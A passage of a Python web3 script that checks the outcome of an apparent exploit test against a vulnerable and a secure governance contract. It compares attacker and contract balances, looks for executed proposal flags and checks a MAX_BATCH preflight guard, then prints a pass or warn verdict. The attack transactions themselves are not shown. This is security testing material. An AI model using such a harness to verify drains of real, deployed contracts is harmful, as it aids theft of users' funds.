        with open(PRECHECK_PATH, "r") as f:
            pre = json.load(f)
    except Exception:
        pre = {}
else:
    pre = {}

def read_balance(addr):
    try:
        return int(w3.eth.get_balance(w3.to_checksum_address(addr)))
    except Exception:
        return None

attacker_before = None
if pre.get("attacker_balance_before") is not None:
    attacker_before = int(pre["attacker_balance_before"])
else:
    # try other keys
    attacker_before = int(pre.get("attacker_balance", 0)) if pre else None

vulnerable_before = None
secure_before = None
if pre.get("vulnerable_balance_before") is not None:
    vulnerable_before = int(pre["vulnerable_balance_before"])
if pre.get("secure_balance_before") is not None:
    secure_before = int(pre["secure_balance_before"])

attacker_after = read_balance(attacker_addr) if attacker_addr else None
vulnerable_after = read_balance(VULNERABLE_ADDRESS)
secure_after = read_balance(SECURE_ADDRESS)

# Helper to probe proposals(pid) and locate boolean executed flag
def proposal_executed_flag(contract, pid):
    try:
        prop = contract.functions.proposals(pid).call()
    except Exception:
        # maybe the getter is named differently; try proposalsMap or proposal
        try:
            prop = contract.functions.proposal(pid).call()
        except Exception:
            return None
    # prop may be a tuple — search for a bool
    for idx, item in enumerate(prop):
        if isinstance(item, bool):
            return bool(item)
    # fallback: common layout address,uint256,bytes,bool,uint256 => index 3
    try:
        return bool(prop[3])
    except Exception:
        return None

# Read MAX_BATCH if available on secure contract
max_batch = None
try:
    max_batch = secure.functions.MAX_BATCH().call()
except Exception:
    # not present or different name; try maxBatch
    try:
        max_batch = secure.functions.maxBatch().call()
    except Exception:
        max_batch = None

# Build summary / computed facts
summary = {
    "vulnerable": {
        "exec_receipt": dict(vuln_exec_rec) if vuln_exec_rec else None,
        "pids": vuln_pids,
        "pids_executed": {},
    },
    "secure": {
        "exec_receipt": dict(sec_exec_rec) if sec_exec_rec else None,
        "pids": sec_pids,
        "pids_executed": {},
        "max_batch": int(max_batch) if max_batch is not None else None
    },
    "balances": {
        "attacker_before": attacker_before,
        "attacker_after": attacker_after,
        "vulnerable_before": vulnerable_before,
        "vulnerable_after": vulnerable_after,
        "secure_before": secure_before,
        "secure_after": secure_after
    }
}

# Populate executed flags (best-effort)
for pid in vuln_pids:
    try:
        executed = proposal_executed_flag(vuln, pid)
    except Exception:
        executed = None
    summary["vulnerable"]["pids_executed"][pid] = executed

for pid in sec_pids:
    try:
        executed = proposal_executed_flag(secure, pid)
    except Exception:
        executed = None
    summary["secure"]["pids_executed"][pid] = executed

# Compute attacker deltas
attacker_delta = None
if attacker_before is not None and attacker_after is not None:
    attacker_delta = attacker_after - attacker_before

vul_delta = None
if vulnerable_before is not None and vulnerable_after is not None:
    vul_delta = vulnerable_before - vulnerable_after

sec_delta = None
if secure_before is not None and secure_after is not None:
    sec_delta = secure_before - secure_after

summary["computed"] = {
    "attacker_delta": attacker_delta,
    "vulnerable_delta": vul_delta,
    "secure_delta": sec_delta
}

# Assertion logic (intended divergence)
assertions = {
    "secure_preflight_guard": False,
    "vulnerable_partial_execution": False,
    "attacker_drained_more_than_expected_on_vulnerable": False,
    "notes": []
}

# 1) Secure behavior: if MAX_BATCH present and len(sec_pids) > MAX_BATCH, secure should revert pre-flight:
if max_batch is not None:
    if len(sec_pids) > int(max_batch):
        # Expect secure exec tx to have reverted (status == 0)
        try:
            sec_status = sec_exec_rec.status if sec_exec_rec is not None else None
        except Exception:
            sec_status = None
        # If contract reverted at require(ids.length > MAX_BATCH...) it should be status == 0 and no pids executed.
        no_exec_flags = all((summary["secure"]["pids_executed"].get(pid) in (False, None)) for pid in sec_pids)
        if sec_status == 0 and no_exec_flags:
            assertions["secure_preflight_guard"] = True
        else:
            assertions["notes"].append("Secure did not revert as expected or some pids executed unexpectedly.")
    else:
        assertions["notes"].append("MAX_BATCH exists but test batch size does not exceed it; cannot assert preflight guard.")
else:
    # no MAX_BATCH found — check secure's receipt: if it reverted immediately (status==0) and no pids executed we treat as guarded
    try:
        sec_status = sec_exec_rec.status if sec_exec_rec is not None else None
    except Exception:
        sec_status = None
    no_exec_flags = all((summary["secure"]["pids_executed"].get(pid) in (False, None)) for pid in sec_pids)
    if sec_status == 0 and no_exec_flags:
        assertions["secure_preflight_guard"] = True
    else:
        assertions["notes"].append("Secure did not show an immediate revert / or pids executed; cannot confirm preflight guard.")

# 2) Vulnerable behavior: expect some pids executed OR attacker gained > TARGET_X_ETH (indicates exploit / partial success)
vul_executed_count = sum(1 for v in summary["vulnerable"]["pids_executed"].values() if v is True)
if vul_executed_count > 0:
    assertions["vulnerable_partial_execution"] = True
else:
    # fallback: check attacker balance delta
    if attacker_delta is not None and attacker_delta >= target_eth_wei * 2:
        assertions["vulnerable_partial_execution"] = True
        assertions["attacker_drained_more_than_expected_on_vulnerable"] = True
    elif attacker_delta is not None and attacker_delta >= target_eth_wei:
        assertions["vulnerable_partial_execution"] = True

# 3) Make a final pass to highlight clear divergence
if assertions["secure_preflight_guard"] and assertions["vulnerable_partial_execution"]:
    assertions["final_verdict"] = "PASS — secure prevented batch, vulnerable allowed partial/ malicious execution."
else:
    assertions["final_verdict"] = "WARN — did not observe the full expected divergence."

# attach summary
out = {"summary": summary, "assertions": assertions}
save_path = save_json(out, "assertions.json")
print("Assertions written ->", save_path)
print("Final verdict:", assertions["final_verdict"])
print(json.dumps(assertions, indent=2))
